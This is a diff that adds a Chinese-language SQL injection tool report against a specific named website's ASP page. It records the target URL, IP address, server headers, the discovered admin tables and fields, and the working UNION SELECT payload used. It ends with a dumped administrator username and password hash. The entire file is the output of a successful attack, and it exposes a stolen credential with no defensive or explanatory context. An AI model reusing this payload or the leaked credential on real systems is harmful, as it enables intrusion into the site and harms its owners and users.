@@ -1,0 +1,32 @@
+■漏洞信息:============================================================
+ ·URL:http://www.1st.com.cn/dianzicontent.asp?id=1717
+ ·页面标题：“你是烈火”
+ ·参数:id=1717
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.191.54.3
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Connection: close
+Date: Sat, 10 Sep 2011 13:27:08 GMT
+Content-Length: 16381
+Content-Type: text/html
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Set-Cookie: ASPSESSIONIDCATCCQTD=DKHLPBLBFJBBAHACOMBCALFG; path=/
+
+
+找到表:admin
+找到表:news
+找到字段:admin.id
+找到字段:admin.username
+找到字段:admin.password
+联合查询列数: 总共= 9  显示的列= 3
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6,7,8,9 from MSysAccessObjects
+------------------------------------------------------------
+username		password		
+patent		a9eb883b1b0a40b77210ec6f709f3831
